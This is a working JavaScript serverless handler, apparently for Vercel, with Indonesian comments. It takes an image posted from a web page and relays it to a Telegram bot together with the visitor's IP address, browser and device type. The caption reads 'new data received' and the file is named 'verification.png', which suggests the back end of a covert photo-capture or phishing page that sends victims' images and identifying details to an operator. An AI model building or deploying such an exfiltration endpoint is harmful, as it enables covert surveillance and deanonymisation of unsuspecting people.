export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { image } = req.body;
    
    if (!image) {
      return res.status(400).json({ error: 'No image data' });
    }

    // Bot credentials - PASTIKAN SUDAH DI SET DI VERCEL
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Bot token or chat ID not configured');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    // Remove data URL prefix
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');

    // Get client info
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('id-ID');
    
    // Detect device type
    let deviceType = 'Desktop';
    if (/Mobile|Android|iPhone/i.test(userAgent)) deviceType = 'Mobile';
    if (/Tablet|iPad/i.test(userAgent)) deviceType = 'Tablet';

    const caption = `🚨 **DATA BARU DITERIMA** 🚨\n\n`
                 + `📍 **IP Address:** \`${ip}\`\n`
                 + `🖥️ **Device:** ${deviceType}\n`
                 + `🌐 **Browser:** ${userAgent.substring(0, 50)}...\n`
                 + `🕒 **Waktu:** ${time}\n\n`
                 + `⚠️ **Data dari Vercel Deployment**`;

    // Send to Telegram using FormData
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');
    
    // Convert buffer to blob and append to form data
    const blob = new Blob([imageBuffer], { type: 'image/png' });
    formData.append('photo', blob, 'verification.png');

    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const result = await telegramResponse.json();

    if (telegramResponse.ok) {
      console.log('Photo sent successfully to Telegram');
      return res.status(200).json({ 
        status: 'success', 
        message: 'Photo sent to Telegram successfully' 
      });
    } else {
      console.error('Telegram API error:', result);
      return res.status(500).json({ 
        status: 'error', 
        message: 'Failed to send to Telegram: ' + (result.description || 'Unknown error')
      });
    }

  } catch (error) {
    console.error('Server error:', error);
    return res.status(500).json({ 
      status: 'error', 
      message: 'Internal server error: ' + error.message 
    });
  }
}